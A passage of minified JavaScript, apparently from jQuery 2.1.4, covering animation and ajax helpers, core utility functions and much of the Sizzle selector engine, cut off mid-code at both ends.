t&&(i.opacity=i.width=e),i}function L(e,t,n){for(var r,i=(nt[t]||[]).concat(nt["*"]),o=0,s=i.length;s>o;o++)if(r=i[o].call(n,t,e))return r}function q(e,t,n){var r,i,o,s,a,u,l,c,f=this,p={},d=e.style,h=e.nodeType&&Ce(e),g=ve.get(e,"fxshow");n.queue||(a=Z._queueHooks(e,"fx"),null==a.unqueued&&(a.unqueued=0,u=a.empty.fire,a.empty.fire=function(){a.unqueued||u()}),a.unqueued++,f.always(function(){f.always(function(){a.unqueued--,Z.queue(e,"fx").length||a.empty.fire()})})),1===e.nodeType&&("height"in t||"width"in t)&&(n.overflow=[d.overflow,d.overflowX,d.overflowY],l=Z.css(e,"display"),c="none"===l?ve.get(e,"olddisplay")||b(e.nodeName):l,"inline"===c&&"none"===Z.css(e,"float")&&(d.display="inline-block")),n.overflow&&(d.overflow="hidden",f.always(function(){d.overflow=n.overflow[0],d.overflowX=n.overflow[1],d.overflowY=n.overflow[2]}));for(r in t)if(i=t[r],Ke.exec(i)){if(delete t[r],o=o||"toggle"===i,i===(h?"hide":"show")){if("show"!==i||!g||void 0===g[r])continue;h=!0}p[r]=g&&g[r]||Z.style(e,r)}else l=void 0;if(Z.isEmptyObject(p))"inline"===("none"===l?b(e.nodeName):l)&&(d.display=l);else{g?"hidden"in g&&(h=g.hidden):g=ve.access(e,"fxshow",{}),o&&(g.hidden=!h),h?Z(e).show():f.done(function(){Z(e).hide()}),f.done(function(){var t;ve.remove(e,"fxshow");for(t in p)Z.style(e,t,p[t])});for(r in p)s=L(h?g[r]:0,r,f),r in g||(g[r]=s.start,h&&(s.end=s.start,s.start="width"===r||"height"===r?1:0))}}function H(e,t){var n,r,i,o,s;for(n in e)if(r=Z.camelCase(n),i=t[r],o=e[n],Z.isArray(o)&&(i=o[1],o=e[n]=o[0]),n!==r&&(e[r]=o,delete e[n]),s=Z.cssHooks[r],s&&"expand"in s){o=s.expand(o),delete e[r];for(n in o)n in e||(e[n]=o[n],t[n]=i)}else t[r]=i}function O(e,t,n){var r,i,o=0,s=tt.length,a=Z.Deferred().always(function(){delete u.elem}),u=function(){if(i)return!1;for(var t=Qe||j(),n=Math.max(0,l.startTime+l.duration-t),r=n/l.duration||0,o=1-r,s=0,u=l.tweens.length;u>s;s++)l.tweens[s].run(o);return a.notifyWith(e,[l,o,n]),1>o&&u?n:(a.resolveWith(e,[l]),!1)},l=a.promise({elem:e,props:Z.extend({},t),opts:Z.extend(!0,{specialEasing:{}},n),originalProperties:t,originalOptions:n,startTime:Qe||j(),duration:n.duration,tweens:[],createTween:function(t,n){var r=Z.Tween(e,l.opts,t,n,l.opts.specialEasing[t]||l.opts.easing);return l.tweens.push(r),r},stop:function(t){var n=0,r=t?l.tweens.length:0;if(i)return this;for(i=!0;r>n;n++)l.tweens[n].run(1);return t?a.resolveWith(e,[l,t]):a.rejectWith(e,[l,t]),this}}),c=l.props;for(H(c,l.opts.specialEasing);s>o;o++)if(r=tt[o].call(l,e,c,l.opts))return r;return Z.map(c,L,l),Z.isFunction(l.opts.start)&&l.opts.start.call(e,l),Z.fx.timer(Z.extend(u,{elem:e,anim:l,queue:l.opts.queue})),l.progress(l.opts.progress).done(l.opts.done,l.opts.complete).fail(l.opts.fail).always(l.opts.always)}function F(e){return function(t,n){"string"!=typeof t&&(n=t,t="*");var r,i=0,o=t.toLowerCase().match(de)||[];if(Z.isFunction(n))for(;r=o[i++];)"+"===r[0]?(r=r.slice(1)||"*",(e[r]=e[r]||[]).unshift(n)):(e[r]=e[r]||[]).push(n)}}function P(e,t,n,r){function i(a){var u;return o[a]=!0,Z.each(e[a]||[],function(e,a){var l=a(t,n,r);return"string"!=typeof l||s||o[l]?s?!(u=l):void 0:(t.dataTypes.unshift(l),i(l),!1)}),u}var o={},s=e===xt;return i(t.dataTypes[0])||!o["*"]&&i("*")}function R(e,t){var n,r,i=Z.ajaxSettings.flatOptions||{};for(n in t)void 0!==t[n]&&((i[n]?e:r||(r={}))[n]=t[n]);return r&&Z.extend(!0,e,r),e}function M(e,t,n){for(var r,i,o,s,a=e.contents,u=e.dataTypes;"*"===u[0];)u.shift(),void 0===r&&(r=e.mimeType||t.getResponseHeader("Content-Type"));if(r)for(i in a)if(a[i]&&a[i].test(r)){u.unshift(i);break}if(u[0]in n)o=u[0];else{for(i in n){if(!u[0]||e.converters[i+" "+u[0]]){o=i;break}s||(s=i)}o=o||s}return o?(o!==u[0]&&u.unshift(o),n[o]):void 0}function W(e,t,n,r){var i,o,s,a,u,l={},c=e.dataTypes.slice();if(c[1])for(s in e.converters)l[s.toLowerCase()]=e.converters[s];for(o=c.shift();o;)if(e.responseFields[o]&&(n[e.responseFields[o]]=t),!u&&r&&e.dataFilter&&(t=e.dataFilter(t,e.dataType)),u=o,o=c.shift())if("*"===o)o=u;else if("*"!==u&&u!==o){if(s=l[u+" "+o]||l["* "+o],!s)for(i in l)if(a=i.split(" "),a[1]===o&&(s=l[u+" "+a[0]]||l["* "+a[0]])){s===!0?s=l[i]:l[i]!==!0&&(o=a[0],c.unshift(a[1]));break}if(s!==!0)if(s&&e["throws"])t=s(t);else try{t=s(t)}catch(f){return{state:"parsererror",error:s?f:"No conversion from "+u+" to "+o}}}return{state:"success",data:t}}function $(e,t,n,r){var i;if(Z.isArray(t))Z.each(t,function(t,i){n||Nt.test(e)?r(e,i):$(e+"["+("object"==typeof i?t:"")+"]",i,n,r)});else if(n||"object"!==Z.type(t))r(e,t);else for(i in t)$(e+"["+i+"]",t[i],n,r)}function I(e){return Z.isWindow(e)?e:9===e.nodeType&&e.defaultView}var B=[],_=B.slice,z=B.concat,X=B.push,U=B.indexOf,V={},Y=V.toString,G=V.hasOwnProperty,Q={},J=e.document,K="2.1.4",Z=function(e,t){return new Z.fn.init(e,t)},ee=/^[\s\uFEFF\xA0]+|[\s\uFEFF\xA0]+$/g,te=/^-ms-/,ne=/-([\da-z])/gi,re=function(e,t){return t.toUpperCase()};Z.fn=Z.prototype={jquery:K,constructor:Z,selector:"",length:0,toArray:function(){return _.call(this)},get:function(e){return null!=e?0>e?this[e+this.length]:this[e]:_.call(this)},pushStack:function(e){var t=Z.merge(this.constructor(),e);return t.prevObject=this,t.context=this.context,t},each:function(e,t){return Z.each(this,e,t)},map:function(e){return this.pushStack(Z.map(this,function(t,n){return e.call(t,n,t)}))},slice:function(){return this.pushStack(_.apply(this,arguments))},first:function(){return this.eq(0)},last:function(){return this.eq(-1)},eq:function(e){var t=this.length,n=+e+(0>e?t:0);return this.pushStack(n>=0&&t>n?[this[n]]:[])},end:function(){return this.prevObject||this.constructor(null)},push:X,sort:B.sort,splice:B.splice},Z.extend=Z.fn.extend=function(){var e,t,n,r,i,o,s=arguments[0]||{},a=1,u=arguments.length,l=!1;for("boolean"==typeof s&&(l=s,s=arguments[a]||{},a++),"object"==typeof s||Z.isFunction(s)||(s={}),a===u&&(s=this,a--);u>a;a++)if(null!=(e=arguments[a]))for(t in e)n=s[t],r=e[t],s!==r&&(l&&r&&(Z.isPlainObject(r)||(i=Z.isArray(r)))?(i?(i=!1,o=n&&Z.isArray(n)?n:[]):o=n&&Z.isPlainObject(n)?n:{},s[t]=Z.extend(l,o,r)):void 0!==r&&(s[t]=r));return s},Z.extend({expando:"jQuery"+(K+Math.random()).replace(/\D/g,""),isReady:!0,error:function(e){throw new Error(e)},noop:function(){},isFunction:function(e){return"function"===Z.type(e)},isArray:Array.isArray,isWindow:function(e){return null!=e&&e===e.window},isNumeric:function(e){return!Z.isArray(e)&&e-parseFloat(e)+1>=0},isPlainObject:function(e){return"object"!==Z.type(e)||e.nodeType||Z.isWindow(e)?!1:e.constructor&&!G.call(e.constructor.prototype,"isPrototypeOf")?!1:!0},isEmptyObject:function(e){var t;for(t in e)return!1;return!0},type:function(e){return null==e?e+"":"object"==typeof e||"function"==typeof e?V[Y.call(e)]||"object":typeof e},globalEval:function(e){var t,n=eval;e=Z.trim(e),e&&(1===e.indexOf("use strict")?(t=J.createElement("script"),t.text=e,J.head.appendChild(t).parentNode.removeChild(t)):n(e))},camelCase:function(e){return e.replace(te,"ms-").replace(ne,re)},nodeName:function(e,t){return e.nodeName&&e.nodeName.toLowerCase()===t.toLowerCase()},each:function(e,t,r){var i,o=0,s=e.length,a=n(e);if(r){if(a)for(;s>o&&(i=t.apply(e[o],r),i!==!1);o++);else for(o in e)if(i=t.apply(e[o],r),i===!1)break}else if(a)for(;s>o&&(i=t.call(e[o],o,e[o]),i!==!1);o++);else for(o in e)if(i=t.call(e[o],o,e[o]),i===!1)break;return e},trim:function(e){return null==e?"":(e+"").replace(ee,"")},makeArray:function(e,t){var r=t||[];return null!=e&&(n(Object(e))?Z.merge(r,"string"==typeof e?[e]:e):X.call(r,e)),r},inArray:function(e,t,n){return null==t?-1:U.call(t,e,n)},merge:function(e,t){for(var n=+t.length,r=0,i=e.length;n>r;r++)e[i++]=t[r];return e.length=i,e},grep:function(e,t,n){for(var r,i=[],o=0,s=e.length,a=!n;s>o;o++)r=!t(e[o],o),r!==a&&i.push(e[o]);return i},map:function(e,t,r){var i,o=0,s=e.length,a=n(e),u=[];if(a)for(;s>o;o++)i=t(e[o],o,r),null!=i&&u.push(i);else for(o in e)i=t(e[o],o,r),null!=i&&u.push(i);return z.apply([],u)},guid:1,proxy:function(e,t){var n,r,i;return"string"==typeof t&&(n=e[t],t=e,e=n),Z.isFunction(e)?(r=_.call(arguments,2),i=function(){return e.apply(t||this,r.concat(_.call(arguments)))},i.guid=e.guid=e.guid||Z.guid++,i):void 0},now:Date.now,support:Q}),Z.each("Boolean Number String Function Array Date RegExp Object Error".split(" "),function(e,t){V["[object "+t+"]"]=t.toLowerCase()});var ie=function(e){function t(e,t,n,r){var i,o,s,a,u,l,f,d,h,g;if((t?t.ownerDocument||t:$)!==q&&L(t),t=t||q,n=n||[],a=t.nodeType,"string"!=typeof e||!e||1!==a&&9!==a&&11!==a)return n;if(!r&&O){if(11!==a&&(i=ye.exec(e)))if(s=i[1]){if(9===a){if(o=t.getElementById(s),!o||!o.parentNode)return n;if(o.id===s)return n.push(o),n}else if(t.ownerDocument&&(o=t.ownerDocument.getElementById(s))&&M(t,o)&&o.id===s)return n.push(o),n}else{if(i[2])return K.apply(n,t.getElementsByTagName(e)),n;if((s=i[3])&&w.getElementsByClassName)return K.apply(n,t.getElementsByClassName(s)),n}if(w.qsa&&(!F||!F.test(e))){if(d=f=W,h=t,g=1!==a&&e,1===a&&"object"!==t.nodeName.toLowerCase()){for(l=k(e),(f=t.getAttribute("id"))?d=f.replace(be,"\\$&"):t.setAttribute("id",d),d="[id='"+d+"'] ",u=l.length;u--;)l[u]=d+p(l[u]);h=xe.test(e)&&c(t.parentNode)||t,g=l.join(",")}if(g)try{return K.apply(n,h.querySelectorAll(g)),n}catch(m){}finally{f||t.removeAttribute("id")}}}return S(e.replace(ue,"$1"),t,n,r)}function n(){function e(n,r){return t.push(n+" ")>T.cacheLength&&delete e[t.shift()],e[n+" "]=r}var t=[];return e}function r(e){return e[W]=!0,e}function i(e){var t=q.createElement("div");try{return!!e(t)}catch(n){return!1}finally{t.parentNode&&t.parentNode.removeChild(t),t=null}}function o(e,t){for(var n=e.split("|"),r=e.length;r--;)T.attrHandle[n[r]]=t}function s(e,t){var n=t&&e,r=n&&1===e.nodeType&&1===t.nodeType&&(~t.sourceIndex||V)-(~e.sourceIndex||V);if(r)return r;if(n)for(;n=n.nextSibling;)if(n===t)return-1;return e?1:-1}function a(e){return function(t){var n=t.nodeName.toLowerCase();return"input"===n&&t.type===e}}function u(e){return function(t){var n=t.nodeName.toLowerCase();return("input"===n||"button"===n)&&t.type===e}}function l(e){return r(function(t){return t=+t,r(function(n,r){for(var i,o=e([],n.length,t),s=o.length;s--;)n[i=o[s]]&&(n[i]=!(r[i]=n[i]))})})}function c(e){return e&&"undefined"!=typeof e.getElementsByTagName&&e}function f(){}function p(e){for(var t=0,n=e.length,r="";n>t;t++)r+=e[t].value;return r}function d(e,t,n){var r=t.dir,i=n&&"parentNode"===r,o=B++;return t.first?function(t,n,o){for(;t=t[r];)if(1===t.nodeType||i)return e(t,n,o)}:function(t,n,s){var a,u,l=[I,o];if(s){for(;t=t[r];)if((1===t.nodeType||i)&&e(t,n,s))return!0}else for(;t=t[r];)if(1===t.nodeType||i){if(u=t[W]||(t[W]={}),(a=u[r])&&a[0]===I&&a[1]===o)return l[2]=a[2];if(u[r]=l,l[2]=e(t,n,s))return!0}}}function h(e){return e.length>1?function(t,n,r){for(var i=e.length;i--;)if(!e[i](t,n,r))return!1;return!0}:e[0]}function g(e,n,r){for(var i=0,o=n.length;o>i;i++)t(e,n[i],r);return r}function m(e,t,n,r,i){for(var o,s=[],a=0,u=e.length,l=null!=t;u>a;a++)(o=e[a])&&(!n||n(o,r,i))&&(s.push(o),l&&t.push(a));return s}function v(e,t,n,i,o,s){return i&&!i[W]&&(i=v(i)),o&&!o[W]&&(o=v(o,s)),r(function(r,s,a,u){var l,c,f,p=[],d=[],h=s.length,v=r||g(t||"*",a.nodeType?[a]:a,[]),y=!e||!r&&t?v:m(v,p,e,a,u),x=n?o||(r?e:h||i)?[]:s:y;if(n&&n(y,x,a,u),i)for(l=m(x,d),i(l,[],a,u),c=l.length;c--;)(f=l[c])&&(x[d[c]]=!(y[d[c]]=f));if(r){if(o||e){if(o){for(l=[],c=x.length;c--;)(f=x[c])&&l.push(y[c]=f);o(null,x=[],l,u)}for(c=x.length;c--;)(f=x[c])&&(l=o?ee(r,f):p[c])>-1&&(r[l]=!(s[l]=f))}}else x=m(x===s?x.splice(h,x.length):x),o?o(null,s,x,u):K.apply(s,x)})}function y(e){for(var t,n,r,i=e.length,o=T.relative[e[0].type],s=o||T.relative[" "],a=o?1:0,u=d(function(e){return e===t},s,!0),l=d(function(e){return ee(t,e)>-1},s,!0),c=[function(e,n,r){var i=!o&&(r||n!==D)||((t=n).nodeType?u(e,n,r):l(e,n,r));return t=null,i}];i>a;a++)if(n=T.relative[e[a].type])c=[d(h(c),n)];else{if(n=T.filter[e[a].type].apply(null,e[a].matches),n[W]){for(r=++a;i>r&&!T.relative[e[r].type];r++);return v(a>1&&h(c),a>1&&p(e.slice(0,a-1).concat({value:" "===e[a-2].type?"*":""})).replace(ue,"$1"),n,r>a&&y(e.slice(a,r)),i>r&&y(e=e.slice(r)),i>r&&p(e))}c.push(n)}return h(c)}function x(e,n){var i=n.length>0,o=e.length>0,s=function(r,s,a,u,l){var c,f,p,d=0,h="0",g=r&&[],v=[],y=D,x=r||o&&T.find.TAG("*",l),b=I+=null==y?1:Math.random()||.1,w=x.length;for(l&&(D=s!==q&&s);h!==w&&null!=(c=x[h]);h++){if(o&&c){for(f=0;p=e[f++];)if(p(c,s,a)){u.push(c);break}l&&(I=b)}i&&((c=!p&&c)&&d--,r&&g.push(c))}if(d+=h,i&&h!==d){for(f=0;p=n[f++];)p(g,v,s,a);if(r){if(d>0)for(;h--;)g[h]||v[h]||(v[h]=Q.call(u));v=m(v)}K.apply(u,v),l&&!r&&v.length>0&&d+n.length>1&&t.uniqueSort(u)}return l&&(I=b,D=y),g};return i?r(s):s}var b,w,T,C,N,k,E,S,D,j,A,L,q,H,O,F,P,R,M,W="sizzle"+1*new Date,$=e.document,I=0,B=0,_=n(),z=n(),X=n(),U=function(e,t){return e===t&&(A=!0),0},V=1<<31,Y={}.hasOwnProperty,G=[],Q=G.pop,J=G.push,K=G.push,Z=G.slice,ee=function(e,t){for(var n=0,r=e.length;r>n;n++)if(e[n]===t)return n;return-1},te="checked|selected|async|autofocus|autoplay|controls|defer|disabled|hidden|ismap|loop|multiple|open|readonly|required|scoped",ne="[\\x20\\t\\r\\n\\f]",re="(?:\\\\.|[\\w-]|[^\\x00-\\xa0])+",ie=re.replace("w","w#"),oe="\\["+ne+"*("+re+")(?:"+ne+"*([*^$|!~]?=)"+ne+"*(?:'((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\"|("+ie+"))|)"+ne+"*\\]",se=":("+re+")(?:\\((('((?:\\\\.|[^\\\\'])*)'|\"((?:\\\\.|[^\\\\\"])*)\")|((?:\\\\.|[^\\\\()[\\]]|"+oe+")*)|.*)\\)|)",ae=new RegExp(ne+"+","g"),ue=new RegExp("^"+ne+"+|((?:^|[^\\\\])(?:\\\\.)*)"+ne+"+$","g"),le=new RegExp("^"+ne+"*,"+ne+"*"),ce=new RegExp("^"+ne+"*([>+~]|"+ne+")"+ne+"*"),fe=new RegExp("="+ne+"*([^\\]'\"]*?)"+ne+"*\\]","g"),pe=new RegExp(se),de=new RegExp("^"+ie+"$"),he={ID:new RegExp("^#("+re+")"),CLASS:new RegExp("^\\.("+re+")"),TAG:new RegExp("^("+re.replace("w","w*")+")"),ATTR:new RegExp("^"+oe),PSEUDO:new RegExp("^"+se),CHILD:new RegExp("^:(only|first|last|nth|nth-last)-(child|of-type)(?:\\("+ne+"*(even|odd|(([+-]|)(\\d*)n|)"+ne+"*(?:([+-]|)"+ne+"*(\\d+)|))"+ne+"*\\)|)","i"),bool:new RegExp("^(?:"+te+")$","i"),needsContext:new RegExp("^"+ne+"*[>+~]|:(even|odd|eq|gt|lt|nth|first|last)(?:\\("+ne+"*((?:-\\d)?\\d*)"+ne+"*\\)|)(?=[^-]|$)","i")},ge=/^(?:input|select|textarea|button)$/i,me=/^h\d$/i,ve=/^[^{]+\{\s*\[native \w/,ye=/^(?:#([\w-]+)|(\w+)|\.([\w-]+))$/,xe=/[+~]/,be=/'|\\/g,we=new RegExp("\\\\([\\da-f]{1,6}"+ne+"?|("+ne+")|.)","ig"),Te=function(e,t,n){var r="0x"+t-65536;return r!==r||n?t:0>r?String.fromCharCode(r+65536):String.fromCharCode(r>>10|55296,1023&r|56320)},Ce=function(){L()};try{K.apply(G=Z.call($.childNodes),$.childNodes),G[$.childNodes.length].nodeType}catch(Ne){K={apply:G.length?function(e,t){J.apply(e,Z.call(t))}:function(e,t){for(var n=e.length,r=0;e[n++]=t[r++];);e.length=n-1}}}w=t.support={},N=t.isXML=function(e){var t=e&&(e.ownerDocument||e).documentElement;return t?"HTML"!==t.nodeName:!1},L=t.setDocument=function(e){var t,n,r=e?e.ownerDocument||e:$;return r!==q&&9===r.nodeType&&r.documentElement?(q=r,H=r.documentElement,n=r.defaultView,n&&n!==n.top&&(n.addEventListener?n.addEventListener("unload",Ce,!1):n.attachEvent&&n.attachEvent("onunload",Ce)),O=!N(r),w.attributes=i(function(e){return e.className="i",!e.getAttribute("className")}),w.getElementsByTagName=i(function(e){return e.appendChild(r.createComment("")),!e.getElementsByTagName("*").length}),w.getElementsByClassName=ve.test(r.getElementsByClassName),w.getById=i(function(e){return H.appendChild(e).id=W,!r.getElementsByName||!r.getElementsByName(W).length}),w.getById?(T.find.ID=function(e,t){if("undefined"!=typeof t.getElementById&&O){var n=t.getElementById(e);return n&&n.parentNode?[n]:[]}},T.filter.ID=function(e){var t=e.replace(we,Te);return function(e){return e.getAttribute("id")===t}}):(delete T.find.ID,T.filter.ID=function(e){var t=e.replace(we,Te);return function(e){var n="undefined"!=typeof e.getAttributeNode&&e.getAttributeNode("id");return n&&n.value===t}}),T.find.TAG=w.getElementsByTagName?function(e,t){return"undefined"!=typeof t.getElementsByTagName?t.getElementsByTagName(e):w.qsa?t.querySelectorAll(e):void 0}:function(e,t){var n,r=[],i=0,o=t.getElementsByTagName(e);if("*"===e){for(;n=o[i++];)1===n.nodeType&&r.push(n);return r}return o},T.find.CLASS=w.getElementsByClassName&&function(e,t){return O?t.getElementsByClassName(e):void 0},P=[],F=[],(w.qsa=ve.test(r.querySelectorAll))&&(i(function(e){H.appendChild(e).innerHTML="<a id='"+W+"'></a><select id='"+W+"-\f]' msallowcapture=''><option selected=''></option></select>",e.querySelectorAll("[msallowcapture^='']").length&&F.push("[*^$]="+ne+"*(?:''|\"\")"),e.querySelectorAll("[selected]").length||F.push("\\["+ne+"*(?:value|"+te+")"),e.querySelectorAll("[id~="+W+"-]").length||F.push("~="),e.querySelectorAll(":checked").length||F.push(":checked"),e.querySelectorAll("a#"+W+"+*").length||F.push(".#.+[+~]")}),i(function(e){var t=r.createElement("input");t.setAttribute("type","hidden"),e.appendChild(t).setAttribute("name","D"),e.querySelectorAll("[name=d]").length&&F.push("name"+ne+"*[*^$|!~]?="),e.querySelectorAll(":enabled").length||F.push(":enabled",":disabled"),e.querySelectorAll("*,:x"),F.push(",.*:")})),(w.matchesSelector=ve.test(R=H.matches||H.webkitMatchesSelector||H.mozMatchesSelector||H.oMatchesSelector||H.msMatchesSelector))&&i(function(e){w.disconnectedMatch=R.call(e,"div"),R.call(e,"[s!='']:x"),P.push("!=",se)}),F=F.length&&new RegExp(F.join("|")),P=P.length&&new RegExp(P.join("|")),t=ve.test(H.compareDocumentPosition),M=t||ve.test(H.contains)?function(e,t){var n=9===e.nodeType?e.documentElement:e,r=t&&t.parentNode;return e===r||!(!r||1!==r.nodeType||!(n.contains?n.contains(r):e.compareDocumentPosition&&16&e.compareDocumentPosition(r)))}:function(e,t){if(t)for(;t=t.parentNode;)if(t===e)return!0;return!1},U=t?function(e,t){if(e===t)return A=!0,0;var n=!e.compareDocumentPosition-!t.compareDocumentPosition;return n?n:(n=(e.ownerDocument||e)===(t.ownerDocument||t)?e.compareDocumentPosition(t):1,1&n||!w.sortDetached&&t.compareDocumentPosition(e)===n?e===r||e.ownerDocument===$&&M($,e)?-1:t===r||t.ownerDocument===$&&M($,t)?1:j?ee(j,e)-ee(j,t):0:4&n?-1:1)}:function(e,t){if(e===t)return A=!0,0;var n,i=0,o=e.parentNode,a=t.parentNode,u=[e],l=[t];if(!o||!a)return e===r?-1:t===r?1:o?-1:a?1:j?ee(j,e)-ee(j,t):0;if(o===a)return s(e,t);for(n=e;n=n.parentNode;)u.unshift(n);for(n=t;n=n.parentNode;)l.unshift(n);for(;u[i]===l[i];)i++;return i?s(u[i],l[i]):u[i]===$?-1:l[i]===$?1:0},r):q},t.matches=function(e,n){return t(e,null,null,n)},t.matchesSelector=function(e,n){if((e.ownerDocument||e)!==q&&L(e),n=n.replace(fe,"='$1']"),w.matchesSelector&&O&&(!P||!P.test(n))&&(!F||!F.test(n)))try{var r=R.call(e,n);if(r||w.disconnectedMatch||e.document&&11!==e.document.nodeType)return r}catch(i){}return t(n,q,null,[e]).length>0},t.contains=function(e,t){return(e.ownerDocument||e)!==q&&L(e),M(e,t)},t.attr=function(e,t){(e.ownerDocument||e)!==q&&L(e);var n=T.attrHandle[t.toLowerCase()],r=n&&Y.call(T.attrHandle,t.toLowerCase())?n(e,t,!O):void 0;return void 0!==r?r:w.attributes||!O?e.getAttribute(t):(r=e.getAttributeNode(t))&&r.specified?r.value:null},t.error=function(e){throw new Error("Syntax error, unrecognized expression: "+e)},t.uniqueSort=function(e){var t,n=[],r=0,i=0;if(A=!w.detectDuplicates,j=!w.sortStable&&e.slice(0),e.sort(U),A){for(;t=e[i++];)t===e[i]&&(r=n.push(i));for(;r--;)e.splice(n[r],1)}return j=null,e},C=t.getText=function(e){var t,n="",r=0,i=e.nodeType;if(i){if(1===i||9===i||11===i){if("string"==typeof e.textContent)return e.textContent;for(e=e.firstChild;e;e=e.nextSibling)n+=C(e)}else if(3===i||4===i)return e.nodeValue}else for(;t=e[r++];)n+=C(t);return n},T=t.selectors={cacheLength:50,createPseudo:r,match:he,attrHandle:{},find:{},relative:{">":{dir:"parentNode",first:!0}," ":{dir:"parentNode"},"+":{dir:"previousSibling",first:!0},"~":{dir:"previousSibling"}},preFilter:{ATTR:function(e){return e[1]=e[1].replace(we,Te),e[3]=(e[3]||e[4]||e[5]||"").replace(we,Te),"~="===e[2]&&(e[3]=" "+e[3]+" "),e.slice(0,4)},CHILD:function(e){return e[1]=e[1].toLowerCase(),"nth"===e[1].slice(0,3)?(e[3]||t.error(e[0]),e[4]=+(e[4]?e[5]+(e[6]||1):2*("even"===e[3]||"odd"===e[3])),e[5]=+(e[7]+e[8]||"odd"===e[3])):e[3]&&t.error(e[0]),e},PSEUDO:function(e){var t,n=!e[6]&&e[2];return he.CHILD.test(e[0])?null:(e[3]?e[2]=e[4]||e[5]||"":n&&pe.test(n)&&(t=k(n,!0))&&(t=n.indexOf(")",n.length-t)-n.length)&&(e[0]=e[0].slice(0,t),e[2]=n.slice(0,t)),e.slice(0,3))}},filter:{TAG:function(e){var t=e.replace(we,Te).toLowerCase();return"*"===e?function(){return!0}:function(e){return e.nodeName&&e.nodeName.toLowerCase()===t}},CLASS:function(e){var t=_[e+" "];return t||(t=new RegExp("(^|"+ne+")"+e+"("+ne+"|$)"))&&_(e,function(e){return t.test("string"==typeof e.className&&e.className||"undefined"!=typeof e.getAttribute&&e.getAttribute("class")||"")})},ATTR:function(e,n,r){return function(i){var o=t.attr(i,e);return null==o?"!="===n:n?(o+="","="===n?o===r:"!="===n?o!==r:"^="===n?r&&0===o.indexOf(r):"*="===n?r&&o.indexOf(r)>-1:"$="===n?r&&o.slice(-r.length)===r:"~="===n?(" "+o.replace(ae," ")+" ").indexOf(r)>-1:"|="===n?o===r||o.slice(0,r.length+1)===r+"-":!1):!0}},CHILD:function(e,t,n,r,i){var o="nth"!==e.slice(0,3),s="last"!==e.slice(-4),a="of-type"===t;return 1===r&&0===i?function(e){return!!e.parentNode}:function(t,n,u){var l,c,f,p,d,h,g=o!==s?"nextSibling":"previousSibling",m=t.parentNode,v=a&&t.nodeName.toLowerCase(),y=!u&&!a;if(m){if(o){for(;g;){for(f=t;f=f[g];)if(a?f.nodeName.toLowerCase()===v:1===f.nodeType)return!1;h=g="only"===e&&!h&&"nextSibling"}return!0}if(h=[s?m.firstChild:m.lastChild],s&&y){for(c=m[W]||(m[W]={}),l=c[e]||[],d=l[0]===I&&l[1],p=l[0]===I&&l[2],f=d&&m.childNodes[d];f=++d&&f&&f[g]||(p=d=0)||h.pop();)if(1===f.nodeType&&++p&&f===t){c[e]=[I,d,p];break}}else if(y&&(l=(t[W]||(t[W]={}))[e])&&l[0]===I)p=l[1];else for(;(f=++d&&f&&f[g]||(p=d=0)||h.pop())&&((a?f.nodeName.toLowerCase()!==v:1!==f.nodeType)||!++p||(y&&((f[W]||(f[W]={}))[e]=[I,p]),f!==t)););return p-=i,p===r||p%r===0&&p/r>=0}}},PSEUDO:function(e,n){var i,o=T.pseudos[e]||T.setFilters[e.toLowerCase()]||t.error("unsupported pseudo: "+e);return o[W]?o(n):o.length>1?(i=[e,e,"",n],T.setFilters.hasOwnProperty(e.toLowerCase())?r(function(e,t){for(var r,i=o(e,n),s=i.length;s--;)r=ee(e,i[s]),e[r]=!(t[r]=i[s])}):function(e){return o(e,0,i)}):o}},pseudos:{not:r(function(e){var t=[],n=[],i=E(e.replace(ue,"$1"));return i[W]?r(function(e,t,n,r){for(var o,s=i(e,null,r,[]),a=e.length;a--;)(o=s[a])&&(e[a]=!(t[a]=o))}):function(e,r,o){return t[0]=e,i(t,null,o,n),t[0]=null,!n.pop()}}),has:r(function(e){return function(n){return t(e,n).length>0}}),contains:r(function(e){return e=e.replace(we,Te),function(t){return(t.textContent||t.innerText||C(t)).indexOf(e)>-1}}),lang:r(function(e){return de.test(e||"")||t.error("unsupported lang: "+e),e=e.replace(we,Te).toLowerCase(),function(t){var n;do if(n=O?t.lang:t.getAttribute("xml:lang")||t.getAttribute("lang"))return n=n.toLowerCase(),n===e||0===n.indexOf(e+"-");while((t=t.parentNode)&&1===t.nodeType);return!1}}),target:function(t){var n=e.location&&e.location.hash;return n&&n.slice(1)===t.id},root:function(e){return e===H},focus:function(e){return e===q.activeElement&&(!q.hasFocus||q.hasFocus())&&!!(e.type||e.href||~e.tabIndex)},enabled:function(e){return e.disabled===!1},disabled:function(e){return e.disabled===!0},checked:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&!!e.checked||"option"===t&&!!e.selected},selected:function(e){return e.parentNode&&e.parentNode.selectedIndex,e.selected===!0},empty:function(e){for(e=e.firstChild;e;e=e.nextSibling)if(e.nodeType<6)return!1;return!0},parent:function(e){return!T.pseudos.empty(e)},header:function(e){return me.test(e.nodeName)},input:function(e){return ge.test(e.nodeName)},button:function(e){var t=e.nodeName.toLowerCase();return"input"===t&&"button"===e.type||"button"===t},text:function(e){var t;return"input"===e.nodeName.toLowerCase()&&"text"===e.type&&(null==(t=e.getAttribute("type"))||"text"===t.toLowerCase())},first:l(function(){return[0]}),last:l(function(e,t){return[t-1]}),eq:l(function(e,t,n){return[0>n?n+t:n]}),even:l(function(e,t){for(var n=0;t>n;n+=2)e.push(n);return e}),odd:l(function(e,t){for(var n=1;t>n;n+=2)e.push(n);return e}),lt:l(function(e,t,n){for(var r=0>n?n+t:n;--r>=0;)e.push(r);return e}),gt:l(function(e,t,n){for(var r=0>n?n+t:n;++r<t;)e.push(r);return e})}},T.pseudos.nth=T.pseudos.eq;for(b in{radio:!0,checkbox:!0,file:!0,password:!0,image:!0})T.pseudos[b]=a(b);for(b in{submit:!0,reset:!0})T.pseudos[b]=u(b);return f.prototype=T.filters=T.pseudos,T.setFilters=new f,k=t.tokenize=function(e,n){var r,i,o,s,a,u,l,c=z[e+" "];if(c)return n?0:c.slice(0);for(a=e,u=[],l=T.preFilter;a;){(!r||(i=le.exec(a)))&&(i&&(a=a.slice(i[0].length)||a),u.push(o=[])),r=!1,(i=ce.exec(a))&&(r=i.shift(),o.push({value:r,type:i[0].replace(ue," ")}),a=a.slice(r.length));for(s in T.filter)!(i=he[s].exec(a))||l[s]&&!(i=l[s](i))||(r=i.shift(),o.push({value:r,type:s,matches:i}),a=a.slice(r.length));if(!r)break}return n?a.length:a?t.error(e):z(e,u).slice(0)},E=t.compile=function(e,t){var 